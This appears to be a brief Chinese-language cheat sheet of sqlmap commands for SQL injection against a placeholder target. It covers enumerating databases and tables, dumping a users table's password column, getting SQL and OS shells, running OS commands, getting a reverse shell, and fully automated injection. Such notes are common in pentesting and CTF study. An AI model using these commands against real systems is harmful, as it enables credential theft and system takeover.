```sql
--help
//查看参数帮助
sqlmap -u "addr" --dbs
//获取数据库
sqlmap -u "addr" -D "security" --tables
//获取数据表
sqlmap -u "addr" -D "security" -T "users" --columns
//获取列
sqlmap -u "addr" -D "security" -T "users" -C "password" --dump
//打印内容
sqlmap -r 指定文件 --dbs
//可以在文件中存储抓包得到的请求，然后在注入点处加上*，之后就可以使用-r指定这个文件来在这个注入点测试了。
//要设置--level=3调整注入级别
--sql-shell
//获取数据库的shell
--os-shell
//获得shell
//要选择语言（PHP...） 路径
//需要level 3
--os-cmd="id"
//cmd
--os-pwn
//获得反弹shell
--users
//查看用户（权限）
--batch --smart
//自动化选择和执行
--batch --smart -a
//完全自动注入
--tamper [modules]
//使用模块
--delay num
//num毫秒发送一个数据包
```

sqlmap tamper解析和使用总结

sqlmap的源代码解析